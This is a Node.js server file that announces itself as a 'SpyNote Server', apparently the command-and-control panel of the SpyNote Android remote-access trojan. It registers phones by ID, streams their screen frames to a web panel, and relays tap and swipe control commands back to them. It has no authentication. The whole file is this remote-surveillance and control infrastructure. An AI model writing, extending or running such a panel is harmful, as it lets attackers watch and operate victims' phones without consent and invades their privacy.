const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000, pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json());

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        console.log("✅ Device registered:", deviceId);
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 New connection:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true,
                socketId: socket.id 
            });
            socket.join(deviceId);
            console.log("📱 Device LIVE:", deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // ✅ FIXED: Event name match + Binary optimization
    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            // ✅ CORRECT EVENT NAME: screen-frame → screen-frame
            socket.to(deviceId).emit('screen-frame', data);
            console.log(`📺 Frame ${deviceId.slice(0,8)}: ${data.size}B`);
        }
    });

    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action,
                x: parseFloat(x) || 0,
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });
            console.log(`🎮 Control ${deviceId.slice(0,8)}: ${action}`);
        }
    });

    socket.on('disconnect', () => {
        for (let [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log("🔌 Device OFFLINE:", deviceId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`\n🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Web Panel: http://localhost:${PORT}`);
});
